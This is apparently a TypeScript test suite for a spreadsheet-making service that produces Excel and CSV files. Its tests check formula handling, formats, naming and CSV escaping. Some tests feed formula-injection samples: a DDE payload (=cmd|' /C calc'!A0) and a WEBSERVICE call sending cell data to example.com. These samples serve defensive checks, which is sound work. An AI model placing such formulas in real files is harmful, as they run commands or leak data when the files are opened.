import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { csvFile, csvValue, describeMadeSpreadsheet, makeSpreadsheet, parseSpreadsheetFormats, workOutFormulas } from "../src/services/spreadsheetMaker.js";
import { parseSheetContent } from "../src/services/sheetData.js";
import { readWorkbook } from "../src/services/xlsxReader.js";
import { readZip } from "../src/services/documentText.js";
import { writeZip } from "../src/services/zipWriter.js";
import { xlsxFile } from "../src/services/xlsxWriter.js";

const folder = mkdtempSync(path.join(tmpdir(), "trhai-spreadsheet-maker-"));
let counter = 0;
const fresh = () => path.join(folder, `case-${(counter += 1)}`, "documents");
process.on("exit", () => rmSync(folder, { recursive: true, force: true }));

const budget = [
  "Item,Qty,Price,Total",
  "Tea,2,$3.50,=B2*C2",
  "Milk,1,$0.80,=B3*C3",
  "Bread,3,$2.25,=B4*C4",
  "Total,=SUM(B2:B4),,=SUM(D2:D4)"
].join("\n");

const made = async (content: string, extra: Partial<Parameters<typeof makeSpreadsheet>[0]> = {}, directory = fresh()) => {
  const result = await makeSpreadsheet({ content, language: "en-US", ...extra }, directory);
  assert.ok(result.ok, result.ok ? "" : result.reason);
  if (!result.ok) throw new Error("not made");
  return { result, directory };
};
const book = (directory: string, name: string) => readWorkbook(readFileSync(path.join(directory, name)));

test("the formats asked for are understood the way a model says them", () => {
  const formats = (value: unknown) => { const parsed = parseSpreadsheetFormats(value); return parsed.ok ? parsed.formats : parsed.reason; };
  assert.deepEqual(formats(undefined), ["xlsx"]);
  assert.deepEqual(formats(""), ["xlsx"]);
  assert.deepEqual(formats("Excel"), ["xlsx"]);
  assert.deepEqual(formats(".xlsx"), ["xlsx"]);
  assert.deepEqual(formats("a spreadsheet file"), ["xlsx"]);
  assert.deepEqual(formats("csv"), ["csv"]);
  assert.deepEqual(formats("Excel and CSV"), ["xlsx", "csv"]);
  assert.deepEqual(formats(["csv", "xlsx", "csv"]), ["csv", "xlsx"]);
  assert.deepEqual(formats("comma separated values"), ["csv"]);
  assert.match(String(formats("ods")), /"ods" is not a format I can make a spreadsheet in\. I can make xlsx \(Excel workbook\) and csv \(CSV file\)\./);
  assert.equal(parseSpreadsheetFormats(7).ok, false);
});

test("a spreadsheet is made in Excel unless another format is asked for, and every cell is read back and found", async () => {
  const { result, directory } = await made(budget, { title: "Shopping List" });
  assert.equal(result.title, "Shopping List");
  assert.equal(result.sheets, 1);
  assert.equal(result.formulas, 5);
  assert.equal(result.cells, 20 - 1, "nineteen cells hold something");
  assert.deepEqual(result.problems, []);
  assert.deepEqual(result.files.map((file) => [file.name, file.checked]), [["Shopping List.xlsx", true]]);
  assert.deepEqual(readdirSync(directory), ["Shopping List.xlsx"]);
  const sheet = book(directory, "Shopping List.xlsx").sheets[0];
  assert.equal(sheet.name, "Sheet1");
  assert.deepEqual(sheet.rows[1].map((cell) => cell.text), ["Tea", "2", "3.5", "7"]);
  assert.equal(sheet.rows[1][3].formula, "B2*C2");
  assert.deepEqual(sheet.rows[4].map((cell) => cell.text), ["Total", "6", "", "14.55"]);
});

/** The number format a cell of a made workbook is shown in, by its code ("General" when it has none). */
function formatCodeAt(directory: string, file: string, reference: string): string {
  const zip = readZip(readFileSync(path.join(directory, file)));
  const sheet = zip.get("xl/worksheets/sheet1.xml")!().toString("utf8");
  const styles = zip.get("xl/styles.xml")!().toString("utf8");
  const style = Number(new RegExp(`<c r="${reference}"(?: s="(\\d+)")?`).exec(sheet)?.[1] ?? 0);
  const custom = new Map([...styles.matchAll(/<numFmt numFmtId="(\d+)" formatCode="([^"]*)"\/>/g)].map((match) => [Number(match[1]), match[2].replace(/&quot;/g, '"')]));
  const builtIn: Record<number, string> = { 0: "General", 1: "0", 2: "0.00", 3: "#,##0", 4: "#,##0.00", 9: "0%", 10: "0.00%" };
  const xfs = [...(/<cellXfs[^>]*>([\s\S]*?)<\/cellXfs>/.exec(styles)?.[1] ?? "").matchAll(/<xf numFmtId="(\d+)"/g)].map((match) => Number(match[1]));
  const id = xfs[style] ?? 0;
  return builtIn[id] ?? custom.get(id) ?? `format ${id}`;
}

test("a total is shown the way the cells it adds up are shown: money as money, a share as a percentage, a ratio as a plain number", async () => {
  const { directory } = await made([
    "Item,Qty,Price,Total,Share",
    "Tea,2,$3.50,=B2*C2,60%",
    "Milk,1,$0.80,=B3*C3,40%",
    "Total,=SUM(B2:B3),,=SUM(D2:D3),=SUM(E2:E3)",
    "Ratio,,,=D4/D2,=E2/E3",
    "Mixed,,,=B2+C2,=E2*10",
    "Words,,,=\"a\"&D2,=IF(1>0,E2,E3)",
    "Clash,,,=C2+E2,"
  ].join("\n"), { title: "Inherit", formats: ["xlsx", "csv"] });
  const at = (reference: string) => formatCodeAt(directory, "Inherit.xlsx", reference);
  assert.equal(at("D2"), '"$"#,##0.00', "a price times a quantity");
  assert.equal(at("D3"), '"$"#,##0.00');
  assert.equal(at("D4"), '"$"#,##0.00', "a total of formulas that are money is money");
  assert.equal(at("B4"), "General", "a total of whole quantities");
  assert.equal(at("E4"), "0%", "a total of shares");
  assert.equal(at("D5"), "General", "a ratio is not money");
  assert.equal(at("E5"), "General");
  assert.equal(at("D6"), '"$"#,##0.00', "a whole number added to money");
  assert.equal(at("E6"), "0%", "a share times a number");
  assert.equal(at("D7"), "General", "text");
  assert.equal(at("E7"), "General", "a choice between two cells is left alone");
  assert.equal(at("D8"), "General", "money added to a percentage is neither");
  const csv = readFileSync(path.join(directory, "Inherit.csv"), "utf8").split("\r\n");
  assert.equal(csv[3], "Total,3,,$7.80,100%", "the CSV shows them the same way");
});

test("the title is what was given, else the sheet's own name when it has one, else Spreadsheet", async () => {
  assert.equal((await made(budget, { title: "  My   List " })).result.title, "My List");
  assert.equal((await made(budget)).result.title, "Spreadsheet");
  assert.equal((await made("## Household budget\n| a | b |\n|---|---|\n| 1 | 2 |")).result.title, "Household budget");
  assert.equal((await made("## One\n| a |\n|---|\n| 1 |\n\n## Two\n| b |\n|---|\n| 2 |")).result.title, "Spreadsheet", "two sheets have no one name");
});

test("formulas are worked out across sheets, and what a spreadsheet program must work out is left to it", async () => {
  const { directory } = await made([
    "## Costs", "| Item | Cost |", "|---|---|", "| Rent | 1200 |", "| Food | 400 |", "| Total | =SUM(B2:B3) |", "",
    "## Summary", "| Label | Value |", "|---|---|", "| Costs | =Costs!B4 |", "| Half | =B2/2 |", "| Items | =COUNTA(Costs!A2:A3) |", "| Big | =IF(B2>1000,\"yes\",\"no\") |", "| Today | =TODAY()+B3 |", "| After | =B6*2 |"
  ].join("\n"), { title: "Books" });
  const [costs, summary] = book(directory, "Books.xlsx").sheets;
  assert.equal(costs.name, "Costs");
  assert.equal(costs.rows[3][1].value, 1600);
  assert.equal(summary.rows[1][1].value, 1600, "another sheet's total");
  assert.equal(summary.rows[2][1].value, 800);
  assert.equal(summary.rows[3][1].value, 2);
  assert.equal(summary.rows[4][1].text, "yes");
  assert.equal(summary.rows[5][1].kind, "empty", "TODAY() is for the spreadsheet program to work out when the file is opened");
  assert.equal(summary.rows[5][1].formula, "TODAY()+B3");
  assert.equal(summary.rows[6][1].formula, "B6*2", "and what depends on it has no answer written either");
  assert.equal(summary.rows[6][1].kind, "empty");
});

test("a formula that cannot be used is kept as the text it was, with the reason, and nothing that reaches out of the file is written", async () => {
  const { result, directory } = await made([
    "| a | b |", "|---|---|",
    "| =SUM(A2;A3) | 1 |",
    "| =FOO(1) | =WEBSERVICE(\"http://example.com/\"&A2) |",
    "| =HYPERLINK(\"http://example.com\") | =cmd\\|' /C calc'!A0 |",
    "| =SUM(A2:A3) | =B2/0 |"
  ].join("\n"));
  const sheet = book(directory, `${result.title}.xlsx`).sheets[0];
  assert.equal(sheet.rows[1][0].kind, "text");
  assert.equal(sheet.rows[1][0].text, "=SUM(A2;A3)");
  assert.equal(sheet.rows[2][0].text, "=FOO(1)");
  assert.equal(sheet.rows[2][1].formula, undefined, "no formula was written for WEBSERVICE");
  assert.equal(sheet.rows[3][1].text, "=cmd|' /C calc'!A0");
  assert.equal(sheet.rows[4][0].formula, "SUM(A2:A3)", "the one that is fine is still a formula");
  const notes = result.problems.join("\n");
  assert.match(notes, /Sheet1!A2: the formula =SUM\(A2;A3\) could not be used \(arguments are separated by commas, not semicolons\), so it is kept as text\./);
  assert.match(notes, /FOO is not a function I know/);
  assert.match(notes, /WEBSERVICE reaches outside the file, so it is not written/);
  assert.match(notes, /HYPERLINK reaches outside the file/);
  assert.match(notes, /Sheet1!B5 comes to #DIV\/0!\./);
  const raw = readZip(readFileSync(path.join(directory, `${result.title}.xlsx`))).get("xl/worksheets/sheet1.xml")!().toString("utf8");
  assert.doesNotMatch(raw, /<f>[^<]*(?:WEBSERVICE|HYPERLINK|cmd[|])/, "none of them is a formula in the file");
});

test("a formula that refers to itself is said to, and the answer a spreadsheet gives for it is an error", async () => {
  const { result } = await made("| a | b |\n|---|---|\n| =B2+1 | =A2+1 |");
  const notes = result.problems.join("\n");
  assert.match(notes, /Sheet1!(?:A2|B2) refers to itself, directly or through other cells\./);
  assert.match(notes, /comes to #REF!/);
});

test("the first row is a header when it is all words, unless it is said to be one or not", async () => {
  const header = async (content: string, extra: Partial<Parameters<typeof makeSpreadsheet>[0]> = {}) => {
    const { directory, result } = await made(content, extra);
    return /autoFilter/.test(readZip(readFileSync(path.join(directory, result.files[0].name))).get("xl/worksheets/sheet1.xml")!().toString("utf8"));
  };
  assert.equal(await header("Name,Score\nAnn,10\nBob,20"), true);
  assert.equal(await header("1,2\n3,4"), false, "numbers are data");
  assert.equal(await header("Name,Score"), false, "one row has nothing under it");
  assert.equal(await header("Name,Score\nAnn,10", { header: false }), false);
  assert.equal(await header("1,2\n3,4", { header: true }), true);
  assert.equal(await header("Name,\nAnn,10"), true, "a gap in the header is a gap");
});

test("a CSV is what a spreadsheet program shows, with what a program would run when it is opened made harmless", async () => {
  const { result, directory } = await made([
    "| Item | Note | Amount | Share | Due | Done |", "|---|---|---|---|---|---|",
    "| Tea, black | say \"hi\" | 1,234,567.5 | 12.5% | 2026-03-04 | TRUE |",
    "| =cmd\\|' /C calc'!A0 | - a dash | $3.50 | -5% | 4 March 2026 | false |",
    "| +1 555 0100 | @user | -4 | 0% | | =IF(1>2,1,0) |",
    "| '=literal | two<br>lines | 007 |   padded   | | =TODAY() |"
  ].join("\n"), { formats: ["csv"], title: "Plain" });
  const text = readFileSync(path.join(directory, "Plain.csv"), "utf8");
  assert.equal(text.charCodeAt(0), 0xfeff, "a mark at the start, as Excel itself writes one");
  const lines = text.slice(1).split("\r\n");
  assert.equal(lines[0], "Item,Note,Amount,Share,Due,Done");
  assert.equal(lines[1], '"Tea, black","say ""hi""","1,234,567.5",12.5%,2026-03-04,TRUE');
  assert.equal(lines[2], "'=cmd|' /C calc'!A0,'- a dash,$3.50,-5%,2026-03-04,FALSE", "a cell that would run when opened starts with an apostrophe, which a spreadsheet program does not show");
  assert.equal(lines[3], "'+1 555 0100,'@user,-4,0%,,0");
  assert.equal(lines[4], "'=literal,\"two\nlines\",007,padded,,'=TODAY()", "padding is trimmed; a formula that is not worked out is text, made harmless");
  assert.deepEqual(result.files.map((file) => [file.name, file.checked]), [["Plain.csv", true]]);
});

test("a CSV holds one sheet, and says which, when there are more", async () => {
  const { result, directory } = await made("## First\n| a | b |\n|---|---|\n| 1 | 2 |\n\n## Second\n| c |\n|---|\n| 3 |", { formats: ["csv", "xlsx"], title: "Two" });
  assert.deepEqual(result.files.map((file) => file.name), ["Two.csv", "Two.xlsx"], "in the order asked");
  assert.match(result.problems.join("\n"), /A CSV file holds one sheet, so Two\.csv has the first, "First"; the other 1 are in the Excel workbook only\./);
  assert.equal(readFileSync(path.join(directory, "Two.csv"), "utf8"), `${String.fromCharCode(0xfeff)}a,b\r\n1,2\r\n`);
  assert.equal(book(directory, "Two.xlsx").sheets.length, 2);
});

test("a control character a file made of XML cannot hold is dropped, and the check is not fooled by it", async () => {
  const { result, directory } = await made(`Name,Note\nbell${String.fromCharCode(7)}ring,tab${String.fromCharCode(1)}bed`);
  assert.deepEqual(result.problems, []);
  assert.equal(result.files[0].checked, true);
  assert.deepEqual(book(directory, result.files[0].name).sheets[0].rows[1].map((cell) => cell.text), ["bellring", "tabbed"]);
});

test("the cells of a CSV are the values of the cells, one by one", () => {
  assert.equal(csvValue({ kind: "number", value: 0.125, format: "0.0%" }), "12.5%");
  assert.equal(csvValue({ kind: "number", value: 1200.5, format: '"$"#,##0.00' }), "$1,200.50");
  assert.equal(csvValue({ kind: "number", value: -1234.5, format: "#,##0" }), "-1,235");
  assert.equal(csvValue({ kind: "number", value: 1.005, format: "0.00" }), "1.01", "rounded the way a spreadsheet rounds");
  assert.equal(csvValue({ kind: "number", value: 0.1 + 0.2, format: null }), "0.3");
  assert.equal(csvValue({ kind: "number", value: -0.001, format: "0.00" }), "0.00", "no minus sign on a zero");
  assert.equal(csvValue({ kind: "date", serial: 46085.5, format: "yyyy-mm-dd" }), "2026-03-04 12:00");
  assert.equal(csvValue({ kind: "formula", formula: "A1", cached: null }), "0");
  assert.equal(csvValue({ kind: "formula", formula: "A1", cached: "=oops" }), "'=oops");
  assert.equal(csvValue({ kind: "formula", formula: "1/0", cached: { error: "#DIV/0!" } }), "#DIV/0!");
  assert.equal(csvFile([[{ kind: "text", text: " a" }, { kind: "text", text: "b" }]]), `${String.fromCharCode(0xfeff)}" a",b\r\n`);
});

test("the files of one spreadsheet share a name, and one that is already there is never replaced", async () => {
  const directory = fresh();
  const first = await made(budget, { title: "Same", formats: ["xlsx", "csv"] }, directory);
  const before = readFileSync(path.join(directory, "Same.xlsx"));
  const second = await made(budget, { title: "Same", formats: ["xlsx", "csv"] }, directory);
  assert.deepEqual(first.result.files.map((file) => file.name), ["Same.xlsx", "Same.csv"]);
  assert.deepEqual(second.result.files.map((file) => file.name), ["Same (2).xlsx", "Same (2).csv"]);
  assert.deepEqual(readFileSync(path.join(directory, "Same.xlsx")), before);
  const results = await Promise.all(Array.from({ length: 5 }, () => makeSpreadsheet({ content: budget, title: "Race" }, directory)));
  const names = results.flatMap((result) => (result.ok ? result.files.map((file) => file.name) : []));
  assert.equal(new Set(names).size, 5, names.join(", "));
});

test("a writer that gets a cell wrong is caught by reading the file back, and the file is kept and said to be doubtful", async () => {
  const directory = fresh();
  const wrong: typeof xlsxFile = (sheets, options) => {
    const good = xlsxFile(sheets, options);
    const entries = [...readZip(good)].map(([name, read]) => ({ name, data: name === "xl/worksheets/sheet1.xml" ? read().toString("utf8").replace("<v>2</v>", "<v>3</v>") : read() }));
    return writeZip(entries, { date: options.date });
  };
  const result = await makeSpreadsheet({ content: budget, title: "Wrong" }, directory, { writeXlsx: wrong });
  assert.ok(result.ok);
  if (!result.ok) return;
  assert.equal(result.files[0].checked, false);
  assert.match(result.problems[0], /The Excel workbook Wrong\.xlsx: Sheet1!B2 was written as 2 and read back as "3"; open it and look before relying on it\./);
  assert.doesNotMatch(describeMadeSpreadsheet(result), /read each file back to check every cell/, "the all-clear is not given");
});

test("nothing to make, and a folder that cannot be made, are each refused plainly, and leave nothing", async () => {
  const empty = await makeSpreadsheet({ content: "  \n  " }, fresh());
  assert.deepEqual(empty, { ok: false, reason: "There was no data to make a spreadsheet from.", problems: [] });
  const blocker = path.join(folder, "a-file-in-the-way");
  writeFileSync(blocker, "x");
  const blocked = await makeSpreadsheet({ content: budget }, blocker);
  assert.equal(blocked.ok, false);
  if (!blocked.ok) assert.match(blocked.reason, /^The folder could not be made/);
});

test("what is told about a spreadsheet is each file by where it is, with the notes after", async () => {
  const { result } = await made("## Costs\n| a | b |\n|---|---|\n| 1 | =A2/0 |\n\n## Two\n| c |\n|---|\n| 3 |", { formats: ["xlsx", "csv"], title: "Told" });
  assert.equal(describeMadeSpreadsheet(result, (absolute) => `documents/${path.basename(absolute)}`), [
    'Made "Told", 6 cells, 1 formula, and read each file back to check every cell:',
    "- documents/Told.xlsx (Excel workbook, 2 sheets)",
    "- documents/Told.csv (CSV file)",
    "Note: Costs!B2 comes to #DIV/0!.",
    'Note: A CSV file holds one sheet, so Told.csv has the first, "Costs"; the other 1 are in the Excel workbook only.'
  ].join("\n"));
  assert.equal(describeMadeSpreadsheet({ ok: false, reason: "There was no data to make a spreadsheet from.", problems: [] }), "There was no data to make a spreadsheet from. Nothing was made.");
});

test("data written as JSON or as tables becomes the same sheets", async () => {
  const fromJson = parseSheetContent('{"Q1":[{"item":"Tea","qty":2}],"Q2":[["item","qty"],["Milk",1]]}');
  assert.ok(fromJson.ok);
  const names = fromJson.ok ? fromJson.sheets.map((sheet) => sheet.name) : [];
  const worked = workOutFormulas(fromJson.ok ? fromJson.sheets : [], names, undefined);
  assert.deepEqual(worked.sheets.map((sheet) => [sheet.name, sheet.rows.length, sheet.header]), [["Q1", 2, true], ["Q2", 2, true]]);
  const oneRow = parseSheetContent("Name,Score");
  assert.ok(oneRow.ok);
  if (oneRow.ok) assert.equal(workOutFormulas(oneRow.sheets, ["Sheet1"], undefined).sheets[0].header, false, "a row with nothing under it is not a header");
});
